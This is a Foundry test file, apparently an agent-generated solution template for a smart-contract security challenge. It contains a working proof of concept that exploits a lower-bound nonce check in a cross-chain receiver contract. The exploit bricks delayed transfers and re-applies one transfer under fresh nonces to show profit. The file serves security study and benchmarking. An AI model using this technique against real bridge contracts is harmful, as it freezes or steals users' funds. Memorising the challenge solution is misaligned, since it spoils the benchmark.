// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: the app's nonce gate is a lower bound (nonce > watermark), not
// an exact sequence check — a first delivery carrying a high nonce bricks all
// delayed in-flight transfers, and the same logical transfer re-applies under
// every fresh nonce (no message-identity dedupe).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroNonceOrdering, DustToken} from "../../src/challenges/LayerZeroNonceOrdering.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        DustToken dst = new DustToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroNonceOrdering oapp = new LayerZeroNonceOrdering(address(dst), endpoint);
        address victim = makeAddr("victim");
        bytes32 peer = bytes32(uint256(uint160(address(oapp))));
        uint256 amount = 100 ether;

        // ATTACK 1 — SEQUENCE BRICKING: first delivery carries nonce 5,
        // burning nonces 1-4. The victim's four in-flight transfers (nonces
        // 1-4) can never apply — funds bricked in flight.
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 5, victim, amount);
        assertEq(dst.balanceOf(victim), amount, "first delivery applies");

        for (uint64 n = 1; n <= 4; n++) {
            vm.prank(endpoint);
            vm.expectRevert(bytes("stale nonce"));
            oapp.lzReceive(30101, peer, n, victim, amount);
        }
        assertEq(dst.balanceOf(victim), amount, "delayed transfers bricked forever");

        // ATTACK 2 — GAP-NONCE DOUBLE APPLY: the same logical transfer keeps
        // applying under fresh nonces; the gate counts positions, not
        // message identity.
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 6, victim, amount);
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 7, victim, amount);
        assertEq(dst.balanceOf(victim), 3 * amount, "identity-less gate re-applies the transfer");
        console2.log("[PROFIT_WEI]", uint256(200 ether));
    }
}
